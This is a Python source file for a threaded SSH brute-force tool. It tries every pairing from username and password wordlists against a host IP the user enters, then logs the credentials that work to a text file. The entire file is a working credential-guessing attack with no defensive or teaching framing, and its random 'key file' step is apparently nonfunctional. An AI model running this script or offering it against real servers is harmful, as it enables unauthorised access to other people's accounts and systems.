import csv
import ipaddress
import threading
import time
import logging
from logging import NullHandler
from paramiko import SSHClient, AutoAddPolicy, AuthenticationException, ssh_exception
import random
import string
import tempfile
import os


# This function is responsible for the ssh client connecting.
def ssh_connect(host, username, password):
    ssh_client = SSHClient()
    # Set the host policies. We add the new hostname and new host key to the local HostKeys object.
    ssh_client.set_missing_host_key_policy(AutoAddPolicy())
    try:
        # Generate a random key for each connection
        key = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        key_filename = None
        try:
            # Create a temporary file to store the key
            key_file = tempfile.NamedTemporaryFile(delete=False)
            key_filename = key_file.name
            # Write the key to the temporary file
            key_file.write(key.encode())
            key_file.close()
            # Set the key for authentication
            ssh_client.connect(host, port=22, username=username, password=password, banner_timeout=300,
                               key_filename=key_filename)
            # If it didn't throw an exception, we know the credentials were successful, so we write it to a file.
            with open("credentials_found.txt", "a") as fh:
                # We write the credentials that worked to a file.
                print(f"Username - {username} and Password - {password} found.")
                fh.write(f"Username: {username}\nPassword: {password}\nWorked on host {host}\n")
        except AuthenticationException:
            print(f"Username - {username} and Password - {password} is Incorrect.")
        except ssh_exception.SSHException:
            print("**** Attempting to connect - Rate limiting on server ****")
        finally:
            # Remove the temporary key file
            if key_filename is not None:
                os.remove(key_filename)
    finally:
        # Close the SSH client after each connection attempt
        ssh_client.close()


# This function gets a valid IP address from the user.
def get_ip_address():
    # We create a while loop, that we'll break out of only once we've received a valid IP Address.
    while True:
        host = input("Please enter the host IP address: ")
        try:
            # Check if host is a valid IPv4 address. If so we return host.
            ipaddress.IPv4Address(host)
            return host
        except ipaddress.AddressValueError:
            # If host is not a valid IPv4 address we send the message that the user should enter a valid IP address.
            print("Please enter a valid IP address.")


# The program will start in the main function.
def __main__():
    logging.getLogger('paramiko.transport').addHandler(NullHandler())
    # To keep to functional programming standards we declare ssh_port inside a function.
    usernames_file = "usernames.txt"
    passwords_file = "passwords.txt"
    host= get_ip_address()

    # This function reads a text file with usernames.
    with open(usernames_file) as usernames_fh:
        usernames = usernames_fh.readlines()
        usernames = [username.strip() for username in usernames]

    # This function reads a text file with passwords.
    with open(passwords_file) as passwords_fh:
        passwords = passwords_fh.readlines()
        passwords = [password.strip() for password in passwords]

    # We use nested loops to iterate over all combinations of usernames and passwords.
    for username in usernames:
        for password in passwords:
            # We create a thread on the ssh_connect function and send the correct arguments to it.
            t = threading.Thread(target=ssh_connect, args=(host, username, password,))
            # We start the thread.
            t.start()
            # We leave a small time between starting a new connection thread.
            time.sleep(0.2)


# We run the main function where execution starts.
__main__()
